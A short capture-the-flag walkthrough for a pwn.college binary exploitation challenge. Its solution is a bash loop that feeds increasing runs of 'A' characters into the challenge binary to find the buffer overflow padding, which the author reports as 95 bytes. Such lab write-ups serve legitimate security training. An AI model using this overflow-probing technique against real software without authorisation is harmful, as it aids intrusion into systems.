# Stage 04: Precision (Hard) — CTF Walkthrough

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Binary Exploitation |
| **Level** | Hard |
| **Estimated Time** | — |
| **Category** | Binary Exploitation / Reversing |
| **Platform** | Linux x86-64 |
| **Binary** | `binary-exploitation-lose-variable` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/binary-exploitation-lose-variable`. The required padding length is not known up front, so it is recovered by brute force: the loop sweeps offsets 63 through 97 and reports each attempt.

## Solution

```bash
for i in {63..97}; do
    echo "Testing $i bytes:"
    python3 -c "print('A' * $i, end='')" | /challenge/binary-exploitation-lose-variable
    echo "---"
done
```

Note from the original run: for me it was 95 bytes.
